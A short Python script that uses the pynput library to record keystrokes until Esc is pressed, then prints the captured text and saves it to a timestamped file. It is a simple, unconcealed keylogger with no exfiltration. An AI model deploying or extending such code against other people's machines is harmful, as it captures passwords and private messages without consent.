from pynput import keyboard
import os
import time

hasil = []

os.system("clear")

def on_press(key):
    global hasil
    try:
        # print('alphanumeric key {0} pressed \t {1}'.format(
        #     key.char,type(key.char)))
        # print(key.char,end='')
        hasil.append(key.char)

    except AttributeError:

        if(key == keyboard.Key.enter):
            # print("\n")
            hasil.append("\n")
        elif(key == keyboard.Key.backspace):
            # print(" [backspace] ",end='')
            hasil = hasil[:-1]
        elif(key == keyboard.Key.space):
            # print(" ",end='')
            hasil.append(" ")
        else:
        # print('special key {0} pressed \t {1}'.format(
        #     key,type(str(key)))) 
            hasil.append(" [{}] ".format(key))

def on_release(key):
    # print('{0} released'.format(
    #     key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
    # print(listener.join())?

print()
for x in range(len(hasil)):
    print(hasil[x],end='')


with open('{}.txt'.format(time.strftime("%c")), 'w') as file:  
    for x in range(len(hasil)):
        # print(hasil[x],end='')
        file.write(hasil[x])
